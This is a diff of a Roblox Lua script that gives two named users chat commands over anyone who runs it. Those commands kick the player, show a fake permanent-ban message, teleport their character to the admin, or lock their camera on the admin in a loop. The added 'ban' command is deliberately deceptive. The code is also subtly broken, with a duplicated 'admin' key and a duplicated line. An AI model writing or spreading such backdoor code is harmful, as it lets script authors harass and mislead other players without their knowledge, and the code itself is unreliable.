@@ -2,8 +2,7 @@
 game.players["kreepozi"].Character.Humanoid.DisplayName = "[👑]67kreepoz"
 game.players["vepiuu"].Character.Humanoid.DisplayName = "[👑]codive"
 
---Admins
-local settings = {
+local moder = {
     admin = "vepiuu",
     admin = "KreepOZi",
     prefix = "!",
@@ -13,21 +12,24 @@ repeat wait() until game:IsLoaded()
 local plrs = game:GetService("Players")
 
 spawn(function()
-    repeat wait() until game:GetService("Players"):FindFirstChild(settings.admin)
+    repeat wait() until game:GetService("Players"):FindFirstChild(moder.admin)
 
-    local admin = plrs[settings.admin]
- local admin = plrs[settings.admin]
-    local prefix = settings.prefix
+    local admin = plrs[moder.admin]
+ local admin = plrs[moder.admin]
+    local prefix = moder.prefix
 
     admin.Chatted:Connect(function(cht)
             --- kick 
         if cht:match(prefix .. "kick " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer:Kick("You have been kicked")
+            --- fake ban
+        elseif cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
+            game.Players.LocalPlayer:Kick("User PERMA BANNED")
              --- brings
         elseif cht:match(prefix .. "bring " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
              --- benx 
-        elseif cht:match(prefix .. "b " .. game.Players.LocalPlayer.Name) then
+        elseif cht:match(prefix .. "benx " .. game.Players.LocalPlayer.Name) then
             game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = admin.Character.HumanoidRootPart
             local benxed = true
             while benxed == true do
